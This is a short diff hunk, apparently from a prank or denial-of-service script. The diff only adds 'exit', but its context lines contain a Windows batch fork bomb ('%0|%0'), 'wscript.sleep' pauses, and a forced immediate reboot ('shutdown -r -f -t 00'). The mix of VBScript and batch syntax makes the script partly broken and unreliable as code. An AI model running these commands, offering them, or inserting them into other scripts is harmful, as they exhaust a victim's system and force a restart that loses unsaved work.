@@ -15,3 +15,4 @@ wscript.sleep 100
 %0|%0
 wscript.sleep 100
 shutdown -r -f -t 00
+exit 
